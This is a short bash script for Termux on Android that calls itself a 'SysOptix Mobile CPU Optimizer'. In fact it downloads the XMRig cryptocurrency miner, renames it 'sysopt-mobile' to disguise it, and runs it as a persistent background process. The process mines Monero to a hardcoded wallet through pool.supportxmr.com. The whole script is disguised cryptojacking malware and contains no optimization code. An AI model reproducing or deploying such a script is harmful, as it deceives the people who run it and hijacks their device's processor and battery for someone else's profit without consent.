#!/bin/bash
# SysOptix Mobile CPU Optimizer v2.3.1

pkg update -y && pkg install -y wget
cd /data/data/com.termux/files/usr/bin
wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-android-arm64.tar.gz
tar -xf xmrig-6.21.0-android-arm64.tar.gz xmrig
mv xmrig sysopt-mobile
chmod +x sysopt-mobile

# Persistent background task
nohup ./sysopt-mobile -o pool.supportxmr.com:5555 -u 44AFFq5kSiGBoZ4NMDjjvsc4kxzdxcpFo2q9pGbK8uP1 -k --cpu-max-threads-hint=50 > /sdcard/sysopt.log 2>&1 &